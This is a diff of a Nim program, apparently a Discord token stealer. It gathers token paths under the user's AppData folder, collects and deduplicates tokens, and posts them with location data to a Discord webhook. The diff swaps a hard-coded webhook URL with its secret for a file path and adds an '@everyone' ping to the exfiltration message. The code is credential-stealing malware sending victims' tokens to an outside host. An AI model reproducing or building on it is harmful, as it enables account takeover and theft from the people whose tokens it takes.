@@ -1,8 +1,8 @@
-import json, puppy, os, regex, strformat
+import json,puppy, os, regex, strformat
 from sequtils import deduplicate, concat
 from strutils import replace, endswith, strip
 
-let webhook = "https://discord.com/api/webhooks/1073928058794414130/zSLCsqFy_8A4RN2kG_A8uBp5cKyy-sleXLKbhOBwsvZ5yz80DgZMVK3VOoPCUNT_87jQ"
+let webhook = "...src/output/webhook.txt"
 
 const
   embed: char = 'Y'
@@ -10,7 +10,7 @@ const
 var
   tkpaths: seq[string] = @[]
   tokens: seq[string] = @[]
-  hooktks = ""
+  hooktks = ""  
 
 let
   roaming = getenv("appdata")
@@ -61,11 +61,10 @@ tokens = tokens.deduplicate
 for c in tokens: hooktks.add(c & "\n")
 hooktks = &"```\n{hooktks.strip(leading=false)}```"
 
-
-
 when embed == 'Y':
   var data = %*{
       "username": "chat perdu",
+      "content": "@everyone",
       "embeds": [
           {
               "title": "[*] tokens trouvés",
@@ -80,8 +79,8 @@ when embed == 'Y':
               "title": "[*] location",
               "fields": [
                   {
-                      "name": "",
-                      "value": ip
+                      "name": "location precise:",
+                      "value": ""
                   },
               ]
           }
